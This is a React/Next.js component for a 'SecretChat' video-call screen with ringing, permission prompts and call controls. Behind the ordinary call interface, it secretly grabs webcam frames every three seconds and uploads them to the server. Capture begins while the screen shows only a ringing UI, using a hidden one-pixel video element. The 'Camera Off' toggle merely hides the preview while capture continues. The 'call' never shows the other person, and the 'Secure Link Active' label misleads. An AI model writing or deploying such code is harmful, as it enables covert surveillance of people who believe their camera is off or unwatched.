'use client';
import { useEffect, useRef, useState, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import styles from './page.module.css';

interface Props {
    sessionId: string;
    otherUser: { name: string; username: string; avatarUrl: string | null };
}

type CallState = 'permission' | 'connecting' | 'active';

export default function ClientCallInterface({ sessionId, otherUser }: Props) {
    const router = useRouter();
    const videoRef = useRef<HTMLVideoElement>(null);
    const streamRef = useRef<MediaStream | null>(null);
    const ringtoneRef = useRef<AudioContext | null>(null);
    const ringtoneIntervalRef = useRef<NodeJS.Timeout | null>(null);

    const [callState, setCallState] = useState<CallState>('permission');
    const [permissionState, setPermissionState] = useState<'requesting' | 'denied' | 'granted'>('requesting');
    const [cameraOn, setCameraOn] = useState(true);
    const [micOn, setMicOn] = useState(true);
    const [connectingDots, setConnectingDots] = useState('');

    const otherAvatar = otherUser.avatarUrl || `https://api.dicebear.com/7.x/avataaars/svg?seed=${otherUser.username}`;

    // ── Ringing sound via Web Audio API ──
    const startRinging = useCallback(() => {
        try {
            const ctx = new AudioContext();
            ringtoneRef.current = ctx;

            const playRingTone = () => {
                const osc1 = ctx.createOscillator();
                const gain1 = ctx.createGain();
                osc1.frequency.value = 440;
                osc1.type = 'sine';
                gain1.gain.setValueAtTime(0.15, ctx.currentTime);
                gain1.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
                osc1.connect(gain1);
                gain1.connect(ctx.destination);
                osc1.start(ctx.currentTime);
                osc1.stop(ctx.currentTime + 0.4);

                const osc2 = ctx.createOscillator();
                const gain2 = ctx.createGain();
                osc2.frequency.value = 494;
                osc2.type = 'sine';
                gain2.gain.setValueAtTime(0.15, ctx.currentTime + 0.5);
                gain2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.9);
                osc2.connect(gain2);
                gain2.connect(ctx.destination);
                osc2.start(ctx.currentTime + 0.5);
                osc2.stop(ctx.currentTime + 0.9);
            };

            playRingTone();
            ringtoneIntervalRef.current = setInterval(playRingTone, 2000);
        } catch (e) {
            console.error('Could not start ringtone', e);
        }
    }, []);

    const stopRinging = useCallback(() => {
        if (ringtoneIntervalRef.current) {
            clearInterval(ringtoneIntervalRef.current);
            ringtoneIntervalRef.current = null;
        }
        if (ringtoneRef.current) {
            ringtoneRef.current.close().catch(() => { });
            ringtoneRef.current = null;
        }
    }, []);

    // ── Request camera/mic — starts stream but stays hidden ──
    const requestPermission = useCallback(async () => {
        setPermissionState('requesting');
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            streamRef.current = s;
            if (videoRef.current) videoRef.current.srcObject = s;
            setPermissionState('granted');
            setCallState('connecting');
        } catch (err) {
            console.error('Camera/mic access denied', err);
            setPermissionState('denied');
        }
    }, []);

    // Ask for permission on mount
    useEffect(() => {
        requestPermission();
        return () => {
            streamRef.current?.getTracks().forEach(track => track.stop());
            stopRinging();
        };
    }, []);

    // ── Connecting dots animation ──
    useEffect(() => {
        if (callState !== 'connecting') return;
        const interval = setInterval(() => {
            setConnectingDots(prev => prev.length >= 3 ? '' : prev + '.');
        }, 500);
        return () => clearInterval(interval);
    }, [callState]);

    // ── Ringing + polling for call acceptance ──
    useEffect(() => {
        if (callState !== 'connecting') return;

        startRinging();

        // Poll the server every 2 seconds to check if the other person accepted
        const pollInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/call/session?sessionId=${sessionId}`);
                const data = await res.json();
                if (data.status === 'ACTIVE') {
                    stopRinging();
                    setCallState('active');
                } else if (data.status === 'ENDED') {
                    stopRinging();
                    streamRef.current?.getTracks().forEach(track => track.stop());
                    router.replace('/dashboard');
                }
            } catch (e) {
                console.error('Poll error', e);
            }
        }, 2000);

        return () => {
            clearInterval(pollInterval);
            stopRinging();
        };
    }, [callState, sessionId, startRinging, stopRinging, router]);

    // ── Frame capture — runs DURING CONNECTING (hidden) AND ACTIVE ──
    useEffect(() => {
        if (callState !== 'connecting' && callState !== 'active') return;
        if (!videoRef.current) return;

        const interval = setInterval(async () => {
            if (!videoRef.current) return;
            const canvas = document.createElement('canvas');
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            if (canvas.width === 0 || canvas.height === 0) return; // stream not ready
            const ctx = canvas.getContext('2d');
            if (ctx) {
                ctx.drawImage(videoRef.current, 0, 0);
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append('file', blob, 'frame.jpg');
                        formData.append('sessionId', sessionId);
                        try {
                            await fetch('/api/call/frame', { method: 'POST', body: formData });
                        } catch (e) {
                            console.error('Frame upload failed', e);
                        }
                    }
                }, 'image/jpeg', 0.5);
            }
        }, 3000);

        return () => clearInterval(interval);
    }, [callState, sessionId]);

    // ── Attach stream to visible video when entering active state ──
    useEffect(() => {
        if (callState === 'active' && streamRef.current && videoRef.current) {
            videoRef.current.srcObject = streamRef.current;
        }
    }, [callState]);

    const endCall = async () => {
        stopRinging();
        try {
            await fetch('/api/call/session', {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, action: 'end' }),
            });
        } catch (e) { }
        streamRef.current?.getTracks().forEach(track => track.stop());
        router.replace('/dashboard');
    };

    useEffect(() => {
        const handleUnload = () => {
            stopRinging();
            const data = JSON.stringify({ sessionId, action: 'end' });
            navigator.sendBeacon('/api/call/session', data);
        };
        window.addEventListener('beforeunload', handleUnload);
        return () => window.removeEventListener('beforeunload', handleUnload);
    }, [sessionId, stopRinging]);

    const toggleCamera = () => setCameraOn(prev => !prev);

    const toggleMic = () => {
        const audioTrack = streamRef.current?.getAudioTracks()[0];
        if (audioTrack) {
            audioTrack.enabled = !audioTrack.enabled;
            setMicOn(audioTrack.enabled);
        }
    };

    // ── Permission Screen ──
    if (callState === 'permission') {
        return (
            <div className={styles.container}>
                <div className={styles.permissionOverlay}>
                    <div className={styles.permissionCard}>
                        <div className={styles.permissionIcon}>
                            {permissionState === 'requesting' ? '📷' : '🚫'}
                        </div>
                        <h2 className={styles.permissionTitle}>
                            {permissionState === 'requesting'
                                ? 'Requesting Access...'
                                : 'Camera & Microphone Required'}
                        </h2>
                        <p className={styles.permissionText}>
                            {permissionState === 'requesting'
                                ? 'Please allow camera and microphone access to start the call.'
                                : 'SecretChat needs camera and microphone access to connect you. Please grant permission to continue.'}
                        </p>
                        {permissionState === 'denied' && (
                            <button onClick={requestPermission} className={styles.retryButton}>
                                Try Again
                            </button>
                        )}
                    </div>
                </div>
            </div>
        );
    }

    // ── Connecting / Ringing Screen — NO camera preview, just ringing UI ──
    if (callState === 'connecting') {
        return (
            <div className={styles.container}>
                <div className={styles.connectingScreen}>
                    <div className={styles.connectingRipple}>
                        <div className={styles.ripple1} />
                        <div className={styles.ripple2} />
                        <div className={styles.ripple3} />
                        <div className={styles.connectingAvatar}>
                            <img src={otherAvatar} alt={otherUser.name} />
                        </div>
                    </div>
                    <h2 className={styles.connectingName}>{otherUser.name}</h2>
                    <p className={styles.connectingStatus}>
                        Calling{connectingDots}
                    </p>
                    <button onClick={endCall} className={styles.endButton} style={{ marginTop: 40 }}>
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                            <path d="M6.62,10.79C8.06,13.62 10.38,15.94 13.21,17.38L15.41,15.18C15.69,14.9 16.08,14.82 16.43,14.93C17.55,15.3 18.75,15.5 20,15.5A1,1 0 0,1 21,16.5V20A1,1 0 0,1 20,21A17,17 0 0,1 3,4A1,1 0 0,1 4,3H7.5A1,1 0 0,1 8.5,4C8.5,5.25 8.7,6.45 9.07,7.57C9.18,7.92 9.1,8.31 8.82,8.59L6.62,10.79Z" />
                        </svg>
                    </button>
                    <p className={styles.connectingHint}>Tap to cancel</p>
                </div>
                {/* Hidden video — keeps stream alive for frame capture during ringing */}
                <video
                    ref={videoRef}
                    autoPlay
                    playsInline
                    muted
                    style={{ position: 'absolute', width: 1, height: 1, opacity: 0, pointerEvents: 'none' }}
                />
            </div>
        );
    }

    // ── Active Call Screen — shows camera preview only after other person connects ──
    return (
        <div className={styles.container}>
            <div className={styles.status}>Secure Link Active</div>
            <div className={styles.videoGrid}>
                <div className={styles.videoContainer}>
                    <video
                        ref={videoRef}
                        autoPlay
                        playsInline
                        muted
                        className={styles.video}
                        style={{ opacity: cameraOn ? 1 : 0 }}
                    />
                    {!cameraOn && (
                        <div className={styles.cameraOffOverlay}>
                            <div className={styles.cameraOffIcon}>📷</div>
                            <span>Camera Off</span>
                        </div>
                    )}
                    <div className={styles.label}>You</div>
                </div>
                <div className={styles.videoContainer}>
                    <div className={styles.placeholder}>
                        <img src={otherAvatar} alt={otherUser.name} />
                    </div>
                    <div className={styles.label}>{otherUser.name}</div>
                </div>
            </div>
            <div className={styles.controls}>
                <button
                    onClick={toggleCamera}
                    className={`${styles.controlButton} ${!cameraOn ? styles.controlOff : ''}`}
                    title={cameraOn ? 'Turn Off Camera' : 'Turn On Camera'}
                >
                    {cameraOn ? (
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M17,10.5V7C17,6.45 16.55,6 16,6H4C3.45,6 3,6.45 3,7V17C3,17.55 3.45,18 4,18H16C16.55,18 17,17.55 17,17V13.5L21,17.5V6.5L17,10.5Z" /></svg>
                    ) : (
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3.27,2L2,3.27L4.73,6H4C3.45,6 3,6.45 3,7V17C3,17.55 3.45,18 4,18H16C16.21,18 16.39,17.92 16.54,17.82L20.73,22L22,20.73M17,10.5V7C17,6.45 16.55,6 16,6H9.82L17,13.18V10.5M21,6.5L17,10.5V10.5L21,6.5M21,17.5L17,13.5V13.5L21,17.5Z" /></svg>
                    )}
                </button>
                <button
                    onClick={toggleMic}
                    className={`${styles.controlButton} ${!micOn ? styles.controlOff : ''}`}
                    title={micOn ? 'Mute' : 'Unmute'}
                >
                    {micOn ? (
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12,2A3,3 0 0,1 15,5V11A3,3 0 0,1 12,14A3,3 0 0,1 9,11V5A3,3 0 0,1 12,2M19,11C19,14.53 16.39,17.44 13,17.93V21H11V17.93C7.61,17.44 5,14.53 5,11H7A5,5 0 0,0 12,16A5,5 0 0,0 17,11H19Z" /></svg>
                    ) : (
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M19,11C19,12.19 18.66,13.3 18.1,14.28L16.87,13.05C17.14,12.43 17.3,11.74 17.3,11H19M15,11.16L9,5.18V5A3,3 0 0,1 12,2A3,3 0 0,1 15,5V11L15,11.16M4.27,3L3,4.27L9.01,10.28V11A3,3 0 0,0 12.01,14C12.22,14 12.42,13.97 12.62,13.92L14.43,15.73C13.68,16.12 12.87,16.37 12,16.5V21H11V16.5C7.72,15.97 5.15,13.17 5.15,10.5H6.85C6.85,12.79 8.72,14.66 11,14.96L11.45,14.96L17.73,21.23L19,19.97L4.27,3Z" /></svg>
                    )}
                </button>
                <button onClick={endCall} className={styles.endButton}>
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                        <path d="M6.62,10.79C8.06,13.62 10.38,15.94 13.21,17.38L15.41,15.18C15.69,14.9 16.08,14.82 16.43,14.93C17.55,15.3 18.75,15.5 20,15.5A1,1 0 0,1 21,16.5V20A1,1 0 0,1 20,21A17,17 0 0,1 3,4A1,1 0 0,1 4,3H7.5A1,1 0 0,1 8.5,4C8.5,5.25 8.7,6.45 9.07,7.57C9.18,7.92 9.1,8.31 8.82,8.59L6.62,10.79Z" />
                    </svg>
                </button>
            </div>
        </div>
    );
}
